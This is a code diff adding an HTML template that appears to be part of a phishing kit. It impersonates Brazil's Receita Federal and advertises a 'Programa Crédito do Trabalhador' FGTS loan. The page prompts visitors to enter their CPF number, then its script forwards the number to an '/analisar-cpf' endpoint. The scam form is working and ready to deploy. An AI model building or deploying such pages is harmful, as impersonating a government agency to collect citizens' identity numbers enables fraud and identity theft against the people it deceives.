@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html data-template="input-cpf">
+<head>
+    <title>Receita Federal - Buscar CPF</title>
+    {% include 'shared_resources.html' %}
+    <style>
+        .initial-content {
+            transition: opacity 0.3s ease;
+        }
+        .cpf-form {
+            background-color: white;
+            padding: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            border: 2px solid #dee2e6;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        .cpf-input:focus {
+            border-color: #1351b4;
+            outline: none;
+        }
+    </style>
+</head>
+<body class="input-cpf-page">
+    <div class="container">
+        <div class="info-box">
+            <div class="initial-content">
+                <h2>Programa Crédito do Trabalhador</h2>
+                <p>Consulte seu limite de empréstimo disponível com condições especiais baseadas no seu FGTS. Juros reduzidos e facilidade de pagamento.</p>
+                <p>Empréstimo com desconto direto no FGTS. Sem comprometer seu salário, sem burocracia. Digite seu CPF para consultar valores disponíveis.</p>
+            </div>
+            <div class="cpf-form" id="cpfFormContainer">
+                <input type="tel" id="cpfInput" class="cpf-input" placeholder="Digite seu CPF" pattern="\d*" maxlength="14">
+                <button id="verifyButton" class="submit-button">
+                    <i class="fas fa-search"></i>
+                    Consultar Valor Disponível
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('cpfInput').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.slice(0, 11);
+
+                if (value.length > 9) {
+                    value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+                } else if (value.length > 6) {
+                    value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
+                } else if (value.length > 3) {
+                    value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
+                }
+
+                e.target.value = value;
+            });
+
+            document.getElementById('verifyButton').addEventListener('click', function() {
+                const cpfInput = document.getElementById('cpfInput');
+                const cpf = cpfInput.value.replace(/\D/g, '');
+
+                if (cpf.length !== 11) {
+                    alert('Por favor, digite um CPF válido');
+                    return;
+                }
+
+                // Redirecionar para a página de análise do CPF
+                window.location.href = `/analisar-cpf?cpf=${cpf}&token={{ verification_token }}`;
+            });
+        });
+    </script>
+
+    <footer class="footer">
+        <p>© Todos os direitos reservados.</p>
+    </footer>
+</body>
+</html> 
